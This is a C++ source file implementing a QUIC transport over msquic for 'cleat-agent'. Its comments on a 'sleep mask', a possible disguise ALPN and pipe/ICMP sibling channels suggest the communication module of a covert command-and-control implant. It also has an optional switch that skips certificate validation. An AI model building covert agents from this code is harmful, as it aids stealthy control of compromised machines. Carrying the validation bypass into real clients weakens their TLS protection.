/**
 * @file MsQuicOps.cpp
 * @brief IQuicOps 的 msquic 实现(Windows)。
 * @details 平台约束:
 *   * msquic 的 Schannel 后端要求 Win11/Server 2022+, Win10 上凭据创建即失败
 *     (SEC_E_NO_CREDENTIALS)—— 故生产形态使用 **OpenSSL(quictls) 后端**构建的
 *     msquic(不依赖 OS TLS 栈, Win10+ 可用);
 *   * Linux 侧 msquic 构建未接入 ThirdParty(当前仅含 Windows 产物), 工厂返回
 *     nullptr, 装配层按"平台不支持"跳过(SelfCheck (c) 类点名)。
 * 线程模型: msquic 回调在其 worker 线程执行, 只做"状态位 + 队列投递"(绝不阻塞);
 *          Handshake/RecvStreamData/Close 由调用方线程驱动, 经条件变量与回调交互。
 */
#include "Core/Comms/Transports/Quic/MsQuicOps.hpp"

#include "Common/Logger/ErrLog.hpp"
#include "Common/Logger/Logger.hpp"
#include "Core/Config/AgentConfig.hpp"

#if defined(_WIN32) && !defined(CLEAT_NO_QUIC)

#include <msquic.h>

#include <atomic>
#include <chrono>
#include <condition_variable>
#include <cstring>
#include <cstdlib>
#include <deque>
#include <mutex>
#include <new>
#include <string>

namespace cleat {

    namespace {

        /// 通道 ALPN。伪装形态(h3)如需另行立项 —— 当前为专用标识, 服务端(quic-go)对齐。
        constexpr const char* kAlpn = "cleat-quic";
        constexpr uint16_t kDefaultQuicPort = 4433;

        /// 收包队列字节上限: 上层未消费时的判死阈值(B3-1 同语义 —— 静默丢字节
        /// 会破坏 4B 定界, "活着但丢数据"比断线重连更危险)。
        constexpr size_t kRxCapBytes = 64 * 1024 * 1024;

        /// 进程级 QUIC 污染标记(睡眠掩码, ): MsQuicOpen2 成功执行过
        /// 即置位, 永不复位 —— msquic 平台线程池(逻辑核数条, start 地址静态链入本镜像)
        /// 在"关闭后是否真退出"经实测确认前(设计), 掩码窗口对本进程永久禁用。
        /// 平凡可析构原子, 静态析构期读写安全。
        std::atomic<bool> g_quic_ever_opened{ false };

        /// "quic://host[:port][/path]" -> host/port(IPv6 字面量 [::1]:port 亦支持)。
        /// 缺 port 时用 kDefaultQuicPort。false = 无法解析。
        bool ParseQuicUrl(const std::string& url, std::string& host, uint16_t& port) {
            const std::string scheme = "quic://";
            if (url.rfind(scheme, 0) != 0) return false;
            std::string rest = url.substr(scheme.size());
            const auto slash = rest.find('/');
            if (slash != std::string::npos) rest = rest.substr(0, slash);
            if (rest.empty()) return false;
            if (rest[0] == '[') {
                const auto close = rest.find(']');
                if (close == std::string::npos) return false;
                host = rest.substr(1, close - 1);
                if (close + 1 < rest.size() && rest[close + 1] == ':') {
                    port = static_cast<uint16_t>(
                        std::strtoul(rest.c_str() + close + 2, nullptr, 10));
                }
                else {
                    port = kDefaultQuicPort;
                }
            }
            else {
                const auto colon = rest.rfind(':');
                if (colon != std::string::npos) {
                    host = rest.substr(0, colon);
                    port = static_cast<uint16_t>(
                        std::strtoul(rest.c_str() + colon + 1, nullptr, 10));
                }
                else {
                    host = rest;
                    port = kDefaultQuicPort;
                }
            }
            return !host.empty() && port != 0;
        }

        /// 发送缓冲: 生命周期覆盖至 SEND_COMPLETE(msquic 异步读取 buffer 描述符与数据。
        /// 实测踩坑: 栈上 QUIC_BUFFER 会发出被复用的栈内存 —— 长度对而内容为垃圾)。
        struct SendPkt {
            QUIC_BUFFER buf{};
            std::vector<uint8_t> data;
        };

    } // namespace

    struct MsQuicOps::Impl {
        const QUIC_API_TABLE* api = nullptr;
        QUIC_REGISTRATION_CONFIG reg_cfg{ "cleat-agent", QUIC_EXECUTION_PROFILE_LOW_LATENCY };
        HQUIC registration = nullptr;
        HQUIC configuration = nullptr;
        HQUIC connection = nullptr;
        HQUIC stream = nullptr;
        /// 连接句柄副本(供流回调触达 ConnectionShutdown; 原子以避回调/外部并发)
        std::atomic<HQUIC> st_owner{ nullptr };
        std::mutex handle_mutex;   ///< 句柄字段互斥(msquic 回调线程 vs 外部调用)
        /// 构建当前 configuration 时的证书策略(变化时重建; 见 Handshake)
        bool cred_ignore_cert = false;

        std::atomic<bool> connected{ false };
        std::atomic<bool> stream_ready{ false };
        std::atomic<bool> dead{ false };
        std::atomic<bool> alive{ false };

        std::mutex wait_mutex;     ///< 收包/握手共用通知锁
        std::condition_variable wait_cv;

        std::deque<std::vector<uint8_t>> rx_chunks;   ///< 回调投递 -> RecvStreamData 消费
        size_t rx_bytes = 0;
        bool rx_overflow = false;

        void WakeAll() { wait_cv.notify_all(); }

        /// 拆连接/流句柄(幂等)。清链路级状态;
        /// 不动 dead 标志 —— 由调用场景决定(Handshake 开头清 / Close 置死)。
        void TeardownConnection() {
            HQUIC st = nullptr, conn = nullptr;
            {
                std::lock_guard<std::mutex> lk(handle_mutex);
                st = stream; stream = nullptr;
                conn = connection; connection = nullptr;
            }
            if (api) {
                if (st) {
                    api->StreamShutdown(st, QUIC_STREAM_SHUTDOWN_FLAG_ABORT, 0);
                    api->StreamClose(st);
                }
                if (conn) {
                    api->ConnectionShutdown(conn, QUIC_CONNECTION_SHUTDOWN_FLAG_NONE, 0);
                    api->ConnectionClose(conn);
                }
            }
            connected.store(false);
            stream_ready.store(false);
            st_owner.store(nullptr);
        }

        // ---------------- msquic 回调(worker 线程; 只做状态位与队列投递, 不阻塞) ----------------

        static QUIC_STATUS QUIC_API OnConnectionCallback(HQUIC conn, void* ctx,
            QUIC_CONNECTION_EVENT* ev) {
            auto* d = static_cast<Impl*>(ctx);
            if (d) d->OnConnectionEvent(conn, ev);
            return QUIC_STATUS_SUCCESS;
        }

        static QUIC_STATUS QUIC_API OnStreamCallback(HQUIC st, void* ctx,
            QUIC_STREAM_EVENT* ev) {
            auto* d = static_cast<Impl*>(ctx);
            if (d) d->OnStreamEvent(st, ev);
            return QUIC_STATUS_SUCCESS;
        }

        void OnConnectionEvent(HQUIC conn, QUIC_CONNECTION_EVENT* ev) {
            switch (ev->Type) {
            case QUIC_CONNECTION_EVENT_CONNECTED: {
                connected.store(true);
                // 握手完成: 客户端开单条双向 stream(通道协议: 一条流承载全部会话帧)
                HQUIC st = nullptr;
                if (QUIC_FAILED(api->StreamOpen(conn, QUIC_STREAM_OPEN_FLAG_NONE,
                    OnStreamCallback, this, &st))) {
                    CLEAT_LOGE(ErrDom::Net, ErrCode::PlatformApiFailed,
                        "MsQuicOps: StreamOpen 失败");
                    dead.store(true);
                    break;
                }
                {
                    std::lock_guard<std::mutex> lk(handle_mutex);
                    stream = st;
                }
                if (QUIC_FAILED(api->StreamStart(st, QUIC_STREAM_START_FLAG_IMMEDIATE))) {
                    CLEAT_LOGE(ErrDom::Net, ErrCode::PlatformApiFailed,
                        "MsQuicOps: StreamStart 失败");
                    dead.store(true);
                }
                break;
            }
            case QUIC_CONNECTION_EVENT_SHUTDOWN_INITIATED_BY_TRANSPORT:
                // 传输层终止(握手被拒/超时/参数错)——状态码带上来便于定位
                LOG_WARN("MsQuicOps: 连接被传输层关闭 status="
                    << static_cast<long>(ev->SHUTDOWN_INITIATED_BY_TRANSPORT.Status));
                dead.store(true);
                break;
            case QUIC_CONNECTION_EVENT_SHUTDOWN_INITIATED_BY_PEER:
                LOG_WARN("MsQuicOps: 连接被对端关闭(code="
                    << ev->SHUTDOWN_INITIATED_BY_PEER.ErrorCode << ")");
                dead.store(true);
                break;
            case QUIC_CONNECTION_EVENT_SHUTDOWN_COMPLETE:
                dead.store(true);
                break;
            case QUIC_CONNECTION_EVENT_PEER_STREAM_STARTED:
                // 通道协议只有客户端开流; 对端开流 = 协议外事件, 直接拒绝
                api->StreamClose(ev->PEER_STREAM_STARTED.Stream);
                break;
            default:
                break;
            }
            WakeAll();
        }

        void OnStreamEvent(HQUIC /*st*/, QUIC_STREAM_EVENT* ev) {
            switch (ev->Type) {
            case QUIC_STREAM_EVENT_START_COMPLETE:
                if (QUIC_FAILED(ev->START_COMPLETE.Status)) {
                    CLEAT_LOGE(ErrDom::Net, ErrCode::PlatformApiFailed,
                        "MsQuicOps: 流启动失败 status="
                        << static_cast<long>(ev->START_COMPLETE.Status));
                    dead.store(true);
                }
                else {
                    stream_ready.store(true);
                }
                break;
            case QUIC_STREAM_EVENT_SEND_COMPLETE:
                // 发送完成: 释放缓冲(生命周期纪律见 SendPkt 注)
                delete static_cast<SendPkt*>(ev->SEND_COMPLETE.ClientContext);
                break;
            case QUIC_STREAM_EVENT_RECEIVE: {
                bool overflow = false;
                {
                    std::lock_guard<std::mutex> lk(wait_mutex);
                    if (!rx_overflow) {
                        for (uint32_t i = 0; i < ev->RECEIVE.BufferCount; ++i) {
                            const uint32_t len = ev->RECEIVE.Buffers[i].Length;
                            if (len == 0) continue;
                            if (rx_bytes + len > kRxCapBytes) {
                                rx_overflow = true;
                                overflow = true;
                                break;
                            }
                            rx_chunks.emplace_back(ev->RECEIVE.Buffers[i].Buffer,
                                ev->RECEIVE.Buffers[i].Buffer + len);
                            rx_bytes += len;
                        }
                    }
                }
                if (overflow) {
                    CLEAT_LOGE(ErrDom::Net, ErrCode::ResourceExhausted,
                        "MsQuicOps: 接收队列超 " << kRxCapBytes / 1024 << "KB, 判定链路不可用");
                    dead.store(true);
                    // 主动终止连接, 让对端尽快感知(丢数据比断线更危险, B3-1 同语义)
                    if (HQUIC owner = st_owner.load()) {
                        api->ConnectionShutdown(owner, QUIC_CONNECTION_SHUTDOWN_FLAG_NONE, 0);
                    }
                }
                break;
            }
            case QUIC_STREAM_EVENT_PEER_SEND_ABORTED:
            case QUIC_STREAM_EVENT_PEER_RECEIVE_ABORTED:
                LOG_WARN("MsQuicOps: 流被对端中止 type=" << static_cast<int>(ev->Type));
                dead.store(true);
                break;
            case QUIC_STREAM_EVENT_SHUTDOWN_COMPLETE:
                dead.store(true);
                break;
            default:
                break;
            }
            WakeAll();
        }
    };

    MsQuicOps::MsQuicOps()
        : impl_(std::make_unique<Impl>()) {
    }

    MsQuicOps::~MsQuicOps() {
        Close();
        Impl& d = *impl_;
        if (d.api) {
            if (d.configuration) {
                d.api->ConfigurationClose(d.configuration);
                d.configuration = nullptr;
            }
            if (d.registration) {
                d.api->RegistrationClose(d.registration);
                d.registration = nullptr;
            }
            MsQuicClose(d.api);
            d.api = nullptr;
        }
    }

    bool MsQuicOps::Handshake(const TransportConfig& cfg) {
        Impl& d = *impl_;
        // 重连: 先拆上一轮连接(registration/configuration 跨轮复用)
        d.TeardownConnection();
        d.dead.store(false);
        d.alive.store(false);
        {
            std::lock_guard<std::mutex> lk(d.wait_mutex);
            d.rx_chunks.clear();
            d.rx_bytes = 0;
            d.rx_overflow = false;
        }

        // 惰性初始化 msquic registration/configuration(跨重连复用)
        if (!d.api) {
            if (QUIC_FAILED(MsQuicOpen2(&d.api)) || d.api == nullptr) {
                CLEAT_LOGE(ErrDom::Net, ErrCode::PlatformApiFailed,
                    "MsQuicOps: MsQuicOpen2 失败(msquic.dll 是否随产物分发?)");
                return false;
            }
            // 成功即污染(睡眠掩码): 本进程此后永久不具备掩码窗口资格
            g_quic_ever_opened.store(true, std::memory_order_release);
        }
        if (!d.registration) {
            if (QUIC_FAILED(d.api->RegistrationOpen(&d.reg_cfg, &d.registration))) {
                CLEAT_LOGE(ErrDom::Net, ErrCode::PlatformApiFailed,
                    "MsQuicOps: RegistrationOpen 失败");
                return false;
            }
        }
        // 证书策略: 对齐 https 的 ignore_cert 开关(SetConfig quic.ignore_cert /
        // CLI --quic-ignore-cert)。策略变化时重建 configuration —— 仅影响后续连接;
        // 旧连接已在本次 Handshake 开头 Teardown, 重建时机天然安全。
        const bool ignore_cert = AgentConfig::Instance().GetQuicIgnoreCert();
        if (d.configuration && d.cred_ignore_cert != ignore_cert) {
            d.api->ConfigurationClose(d.configuration);
            d.configuration = nullptr;
        }
        if (!d.configuration) {
            QUIC_BUFFER alpn;
            alpn.Length = static_cast<uint32_t>(std::strlen(kAlpn));
            alpn.Buffer = reinterpret_cast<uint8_t*>(const_cast<char*>(kAlpn));
            if (QUIC_FAILED(d.api->ConfigurationOpen(d.registration, &alpn, 1,
                nullptr, 0, nullptr, &d.configuration))) {
                CLEAT_LOGE(ErrDom::Net, ErrCode::PlatformApiFailed,
                    "MsQuicOps: ConfigurationOpen 失败");
                return false;
            }
            QUIC_CREDENTIAL_CONFIG cred = {};
            cred.Type = QUIC_CREDENTIAL_TYPE_NONE;
            cred.Flags = QUIC_CREDENTIAL_FLAG_CLIENT;
            if (ignore_cert) {
                // 自签场景显式跳过(默认严格校验, 与 https_ignore_cert 同语义)
                cred.Flags |= QUIC_CREDENTIAL_FLAG_NO_CERTIFICATE_VALIDATION;
            }
            if (QUIC_FAILED(d.api->ConfigurationLoadCredential(d.configuration, &cred))) {
                CLEAT_LOGE(ErrDom::Net, ErrCode::PlatformApiFailed,
                    "MsQuicOps: ConfigurationLoadCredential 失败");
                return false;
            }
            d.cred_ignore_cert = ignore_cert;
        }

        std::string host;
        uint16_t port = 0;
        if (!ParseQuicUrl(cfg.url, host, port)) {
            CLEAT_LOGE(ErrDom::Net, ErrCode::IntegrityMismatch,
                "MsQuicOps: URL 无法解析: " << cfg.url);
            return false;
        }

        HQUIC conn = nullptr;
        if (QUIC_FAILED(d.api->ConnectionOpen(d.registration, Impl::OnConnectionCallback,
            &d, &conn))) {
            CLEAT_LOGE(ErrDom::Net, ErrCode::PlatformApiFailed, "MsQuicOps: ConnectionOpen 失败");
            return false;
        }
        {
            std::lock_guard<std::mutex> lk(d.handle_mutex);
            d.connection = conn;
        }
        d.st_owner = conn;
        if (QUIC_FAILED(d.api->ConnectionStart(conn, d.configuration,
            QUIC_ADDRESS_FAMILY_UNSPEC, host.c_str(), port))) {
            CLEAT_LOGE(ErrDom::Net, ErrCode::PlatformApiFailed,
                "MsQuicOps: ConnectionStart 失败 target=" << host << ":" << port);
            d.TeardownConnection();
            d.st_owner = nullptr;
            return false;
        }

        // 等到 "已连接 + 流已开"(或失败/超时)
        const uint32_t timeout_ms = cfg.timeout_ms ? cfg.timeout_ms : 5000u;
        const auto deadline = std::chrono::steady_clock::now()
            + std::chrono::milliseconds(timeout_ms);
        std::unique_lock<std::mutex> lk(d.wait_mutex);
        while (!(d.connected.load() && d.stream_ready.load()) && !d.dead.load()) {
            if (d.wait_cv.wait_until(lk, deadline) == std::cv_status::timeout) {
                break;
            }
        }
        lk.unlock();

        if (d.connected.load() && d.stream_ready.load() && !d.dead.load()) {
            d.alive.store(true);
            LOG_INFO("MsQuicOps: QUIC 通道就绪 target=" << host << ":" << port
                << " alpn=" << kAlpn);
            return true;
        }
        CLEAT_LOGE(ErrDom::Net, ErrCode::PeerDisconnected,
            "MsQuicOps: 握手失败/超时 target=" << host << ":" << port
            << " connected=" << d.connected.load()
            << " stream=" << d.stream_ready.load()
            << " dead=" << d.dead.load());
        d.TeardownConnection();
        d.st_owner = nullptr;
        return false;
    }

    bool MsQuicOps::SendStreamData(const uint8_t* data, size_t len) {
        Impl& d = *impl_;
        if (!d.alive.load() || d.dead.load()) {
            return false;
        }
        HQUIC st = nullptr;
        {
            std::lock_guard<std::mutex> lk(d.handle_mutex);
            st = d.stream;
        }
        if (!st) {
            return false;
        }
        auto* pkt = new (std::nothrow) SendPkt();
        if (!pkt) {
            CLEAT_LOGE(ErrDom::Net, ErrCode::ResourceExhausted,
                "MsQuicOps: 发送缓冲分配失败 len=" << len);
            return false;
        }
        pkt->data.assign(data, data + len);
        pkt->buf.Length = static_cast<uint32_t>(pkt->data.size());
        pkt->buf.Buffer = pkt->data.data();
        if (QUIC_FAILED(d.api->StreamSend(st, &pkt->buf, 1,
            QUIC_SEND_FLAG_NONE, pkt))) {
            delete pkt;
            CLEAT_LOGE(ErrDom::Net, ErrCode::PlatformApiFailed,
                "MsQuicOps: StreamSend 失败 len=" << len);
            return false;
        }
        return true;
    }

    int MsQuicOps::RecvStreamData(std::vector<uint8_t>& out, int timeout_ms) {
        Impl& d = *impl_;
        std::unique_lock<std::mutex> lk(d.wait_mutex);
        auto take = [&]() -> int {
            out = std::move(d.rx_chunks.front());
            d.rx_chunks.pop_front();
            d.rx_bytes -= out.size();
            return 1;
        };
        if (!d.rx_chunks.empty()) return take();
        if (d.rx_overflow || d.dead.load()) return -1;
        if (timeout_ms <= 0) return 0;
        const auto deadline = std::chrono::steady_clock::now()
            + std::chrono::milliseconds(timeout_ms);
        while (true) {
            if (d.wait_cv.wait_until(lk, deadline) == std::cv_status::timeout) {
                if (!d.rx_chunks.empty()) return take();
                return (d.rx_overflow || d.dead.load()) ? -1 : 0;
            }
            if (!d.rx_chunks.empty()) return take();
            if (d.rx_overflow || d.dead.load()) return -1;
        }
    }

    void MsQuicOps::Close() {
        Impl& d = *impl_;
        d.alive.store(false);
        d.TeardownConnection();
        {
            //  主动关闭 = 作废全部链路级状态(含未消费字节, 不得跨重连交付)
            std::lock_guard<std::mutex> lk(d.wait_mutex);
            d.rx_chunks.clear();
            d.rx_bytes = 0;
        }
        d.dead.store(true);
        d.WakeAll();
    }

    bool MsQuicOps::IsAlive() const {
        return impl_->alive.load() && !impl_->dead.load();
    }

    std::unique_ptr<IQuicOps> CreateQuicOps() {
        return std::make_unique<MsQuicOps>();
    }

    bool QuicEverOpened() {
        return g_quic_ever_opened.load(std::memory_order_acquire);
    }

} // namespace cleat

#else // 无 msquic 实现: 非 Windows, 或 Windows 上 CLEAT_WITH_QUIC=OFF(体积裁剪)

namespace cleat {

    std::unique_ptr<IQuicOps> CreateQuicOps() {
        // msquic 未编入(平台不支持 / 构建期裁剪): 返回 nullptr 与
        // make_pipe/make_icmp 的平台不支持行为一致
        // (装配层按"通道构建失败"跳过, SelfCheck (c) 类点名)。
        return nullptr;
    }

    bool QuicEverOpened() {
        // msquic 未编入 = 不可能打开 = 恒未污染(掩码资格不受限)
        return false;
    }

} // namespace cleat

#endif // msquic 实现开关
